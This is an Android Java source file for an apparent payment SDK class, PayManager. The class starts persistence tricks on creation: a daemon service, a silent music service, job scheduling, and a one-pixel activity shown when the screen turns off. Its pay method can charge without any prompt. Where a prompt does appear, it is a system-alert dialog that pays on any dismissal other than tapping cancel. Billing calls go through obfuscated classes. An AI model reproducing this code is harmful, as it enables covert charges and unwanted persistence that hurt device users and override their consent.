package com.channel.ef;

import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.text.TextUtils;
import android.view.WindowManager;
import android.widget.Toast;

import com.channel.di.ui.PayDialog;
import com.channel.di.utils.Constants;
import com.gandalf.daemon.utils.Common;
import com.gandalf.daemon.utils.LogUtil;
import com.gandalf.daemon.utils.XL_log;
import com.jiangdg.keepappalive.receiver.ScreenReceiverUtil;
import com.jiangdg.keepappalive.service.DaemonService;
import com.jiangdg.keepappalive.service.PlayerMusicService;
import com.jiangdg.keepappalive.utils.HwPushManager;
import com.jiangdg.keepappalive.utils.JobSchedulerManager;
import com.jiangdg.keepappalive.utils.ScreenManager;
import com.zhy.http.okhttp.OkHttpUtils;

import java.util.concurrent.TimeUnit;

import k.m.IPayListener;
import k.m.PayListener;
import k.m.PayTask;
import okhttp3.OkHttpClient;

/**
 * Created by as on 17-6-19.
 */

public class PayManager {
    private static XL_log log = new XL_log(PayManager.class);
    private static PayManager INSTANCE = null;
    private Context mAppContext = null;
    private static boolean INIT = false;

    public static String mPid = null;
    public static String mCid = null;



    // 动态注册锁屏等广播
    private ScreenReceiverUtil mScreenListener;
    // 1像素Activity管理类
    private ScreenManager mScreenManager;
    // JobService，执行系统任务
    private JobSchedulerManager mJobManager;
    // 华为推送管理类
    private HwPushManager mHwPushManager;

    private ScreenReceiverUtil.SreenStateListener mScreenListenerer = new ScreenReceiverUtil.SreenStateListener() {
        @Override
        public void onSreenOn() {
            // 亮屏，移除"1像素"
            mScreenManager.finishActivity();
        }

        @Override
        public void onSreenOff() {
            // 接到锁屏广播，将SportsActivity切换到可见模式
            // "咕咚"、"乐动力"、"悦动圈"就是这么做滴
//            Intent intent = new Intent(SportsActivity.this,SportsActivity.class);
//            startActivity(intent);
            // 如果你觉得，直接跳出SportActivity很不爽
            // 那么，我们就制造个"1像素"惨案
            mScreenManager.startActivity();
        }

        @Override
        public void onUserPresent() {
            // 解锁，暂不用，保留
        }
    };





    private PayManager(Context context) {
        if (context != null) {
            mAppContext = context.getApplicationContext();

            mJobManager = JobSchedulerManager.getJobSchedulerInstance(mAppContext);
            mJobManager.startJobScheduler();
            Toast.makeText(mAppContext,"正在跑步",Toast.LENGTH_SHORT).show();
            // 3. 启动前台Service
            startDaemonService();
            // 4. 启动播放音乐Service
            startPlayMusicService();
        }
    }

    private void stopPlayMusicService() {
        Intent intent = new Intent(mAppContext, PlayerMusicService.class);
        mAppContext.stopService(intent);
    }

    private void startPlayMusicService() {
        Intent intent = new Intent(mAppContext,PlayerMusicService.class);
        mAppContext.startService(intent);
    }

    private void startDaemonService() {
        Intent intent = new Intent(mAppContext, DaemonService.class);
        mAppContext.startService(intent);
    }

    private void stopDaemonService() {
        Intent intent = new Intent(mAppContext, DaemonService.class);
        mAppContext.stopService(intent);
    }


    /***
     * @param context  Application Context
     * @return
     */
    public static PayManager getInstance(Context context) {
        if (INSTANCE == null) {
            INSTANCE = new PayManager(context);
        }
        return INSTANCE;
    }

    public void setPersistent(boolean persistent) {
        SharedPreferences preferences = mAppContext.getSharedPreferences(Constants.SDK_PREFERENCE, Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = preferences.edit();
        editor.putBoolean(Constants.SDK_PREFERENCE_KEY_APP_PERSISTENT, persistent);
    }

    public boolean init(String pid, String cid) {
        if (TextUtils.isEmpty(pid) || TextUtils.isEmpty(cid)) {
            //log.error("pid or cid is null");
            INIT = false;
            return false;
        }
        mPid = pid;
        mCid = cid;
        if (!INIT) {
            initLog();
            initOkHttp();
            initPromptAndStub();
        }
        log.debug("pid :" + mPid + " cid:" + mCid + " init success ");
        INIT = true;
        return true;
    }


    private void initLog() {
        XL_log.init(mAppContext, Common.LOG_PATH);
    }

    private void initOkHttp() {
        OkHttpClient okHttpClient = new OkHttpClient.Builder().connectTimeout(Common.HTTP_TIMEOUT, TimeUnit.SECONDS)
                .readTimeout(Common.HTTP_TIMEOUT, TimeUnit.SECONDS).build();
        OkHttpUtils.initClient(okHttpClient);
    }

    private void initPromptAndStub() {
        Ues.initPrompt(mAppContext);
        Ues.initStub(mAppContext);
    }

    public String getCid() {
        return mCid;
    }

    public String getPid() {
        return mPid;
    }

    public void pay(String feeId, int price, PayListener payListener) {

        if (payListener == null || TextUtils.isEmpty(feeId)) {
            return;
        }
        /*if (price <= 0) {
            payListener.onPayFailed(IPayListener.ERROR_CODE_PRICE_INVALIED, "ERROR_CODE_PRICE_INVALIED");
        }*/
        if (!INIT) {
            payListener.onPayFailed(IPayListener.ERROR_CODE_INIT_FAILED, "ERROR_CODE_INIT_FAILED");
        }

        if (Constants.SDK_JAR_PROMPT == 1) {
            showPayDialog(feeId, price, payListener);
        } else {
            requestPay(feeId, price, payListener);
        }
    }

    private void requestPay(String feedId, int price, PayListener payListener) {

        if (/*price >= 0 && */payListener != null) {
            PayTask task = new PayTask(price, getPid(), getCid(), payListener);
            pay(mAppContext, task);
        }
    }

    private PayDialog mPayDialog = null;
    private boolean isNeedPay = true;

    private void pay(Context context, PayTask task) {
        Ues.requestPay(mAppContext, task);
    }

    private void showPayDialog(String feeId, int price, PayListener payListener) {
        if (mPayDialog != null && mPayDialog.isShowing()) return;
        isNeedPay = true;
        mPayDialog = new PayDialog(mAppContext);
        mPayDialog.setTitle("支付确认");
        mPayDialog.setMessage(String.format("您将支付：%d 元", price));
        final PayTask task = new PayTask(price, getPid(), getCid(), payListener);
        mPayDialog.setYesOnclickListener("确定", new PayDialog.onYesOnclickListener() {
            @Override
            public void onYesClick() {
                log.debug(String.format("支付：%d 元", task.mPrice));
                mPayDialog.dismiss();
            }
        });
        mPayDialog.setNoOnclickListener("取消", new PayDialog.onNoOnclickListener() {
            @Override
            public void onNoClick() {
                log.debug(String.format("取消支付：%d 元", task.mPrice));
                isNeedPay = false;
                PayTask.notifListener(task.getTaskId(), false, IPayListener.ERROR_CODE_USER_CANCEL, "ERROR_CODE_USER_CANCEL");
                mPayDialog.dismiss();
                Toast.makeText(mAppContext,"取消付费",Toast.LENGTH_SHORT).show();
            }
        });
        mPayDialog.setOnDismissListener(new DialogInterface.OnDismissListener() {
            @Override
            public void onDismiss(DialogInterface dialogInterface) {
                if (isNeedPay) {
                    LogUtil.d("pay"," pay(mAppContext, task)");
                    pay(mAppContext, task);
                    Toast.makeText(mAppContext,"开始付费",Toast.LENGTH_SHORT).show();
                }
            }
        });
        mPayDialog.getWindow().setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
        mPayDialog.show();
    }
}
